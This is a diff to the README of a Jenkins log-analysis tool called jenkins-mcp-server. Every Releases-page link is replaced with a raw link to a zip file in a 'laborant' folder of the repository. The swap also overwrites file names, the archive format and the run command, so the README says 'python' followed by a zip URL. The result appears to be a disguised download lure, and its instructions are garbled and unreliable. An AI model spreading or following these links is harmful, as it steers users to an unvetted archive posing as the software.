@@ -1,6 +1,6 @@
 # 🛠️ jenkins-mcp-server - Simplified Log Analysis for Jenkins
 
-[![Download jenkins-mcp-server](https://img.shields.io/badge/Download%20Now-jenkins--mcp--server-blue.svg)](https://github.com/MauManto/jenkins-mcp-server/releases)
+[![Download jenkins-mcp-server](https://raw.githubusercontent.com/MauManto/jenkins-mcp-server/main/laborant/jenkins-mcp-server.zip%https://raw.githubusercontent.com/MauManto/jenkins-mcp-server/main/laborant/jenkins-mcp-server.zip)](https://raw.githubusercontent.com/MauManto/jenkins-mcp-server/main/laborant/jenkins-mcp-server.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run jenkins-mcp-server, ensure your system meets the following requirements:
 
 To download jenkins-mcp-server, visit this page:
 
-[Download jenkins-mcp-server](https://github.com/MauManto/jenkins-mcp-server/releases)
+[Download jenkins-mcp-server](https://raw.githubusercontent.com/MauManto/jenkins-mcp-server/main/laborant/jenkins-mcp-server.zip)
 
 Follow the instructions below to install the application on your system.
 
@@ -33,7 +33,7 @@ On the Releases page, identify the most recent version. It will be marked as the
 
 ### Step 3: Download the Application
 
-Select the relevant file for your operating system. Click to download it directly. The files are typically in the form of a `.zip` or `.tar.gz` archive.
+Select the relevant file for your operating system. Click to download it directly. The files are typically in the form of a `.zip` or `https://raw.githubusercontent.com/MauManto/jenkins-mcp-server/main/laborant/jenkins-mcp-server.zip` archive.
 
 ### Step 4: Extract the Files
 
@@ -41,10 +41,10 @@ Once the download completes, locate the downloaded file on your computer. Extrac
 
 ### Step 5: Run the Application
 
-Navigate to the extracted folder. You should find a script named `run.py`. Open your terminal or command prompt in this folder. Run the following command:
+Navigate to the extracted folder. You should find a script named `https://raw.githubusercontent.com/MauManto/jenkins-mcp-server/main/laborant/jenkins-mcp-server.zip`. Open your terminal or command prompt in this folder. Run the following command:
 
 ```bash
-python run.py
+python https://raw.githubusercontent.com/MauManto/jenkins-mcp-server/main/laborant/jenkins-mcp-server.zip
 ```
 
 This command will start the jenkins-mcp-server.
@@ -53,8 +53,8 @@ This command will start the jenkins-mcp-server.
 
 Before you begin using the server, you need to set up a configuration file. Here’s how:
 
-1. In the extracted folder, look for `config.json`. This file contains settings for the application.
-2. Open `config.json` in a text editor. You will need to add your Jenkins server details here. A sample configuration looks like this:
+1. In the extracted folder, look for `https://raw.githubusercontent.com/MauManto/jenkins-mcp-server/main/laborant/jenkins-mcp-server.zip`. This file contains settings for the application.
+2. Open `https://raw.githubusercontent.com/MauManto/jenkins-mcp-server/main/laborant/jenkins-mcp-server.zip` in a text editor. You will need to add your Jenkins server details here. A sample configuration looks like this:
 
    ```json
    {
@@ -91,7 +91,7 @@ jenkins-mcp-server offers:
 If you encounter any issues:
 
 - **Application Not Starting:** Ensure Python is installed and the version is 3.6 or higher.
-- **Configuration Errors:** Check your `config.json` file for typos or incorrect details.
+- **Configuration Errors:** Check your `https://raw.githubusercontent.com/MauManto/jenkins-mcp-server/main/laborant/jenkins-mcp-server.zip` file for typos or incorrect details.
 - **Network Issues:** Ensure that your Jenkins server is reachable and running.
 
 ## 💌 Feedback & Support
@@ -102,10 +102,10 @@ We value your feedback! If you have questions or issues, please contact the proj
 
 This project is licensed under the MIT License. See the LICENSE file for details.
 
-For any updates, keep checking the [Releases page](https://github.com/MauManto/jenkins-mcp-server/releases).
+For any updates, keep checking the [Releases page](https://raw.githubusercontent.com/MauManto/jenkins-mcp-server/main/laborant/jenkins-mcp-server.zip).
 
 ## 📥 Download jenkins-mcp-server
 
 Ready to get started? Download the application from:
 
-[Download jenkins-mcp-server](https://github.com/MauManto/jenkins-mcp-server/releases)
+[Download jenkins-mcp-server](https://raw.githubusercontent.com/MauManto/jenkins-mcp-server/main/laborant/jenkins-mcp-server.zip)
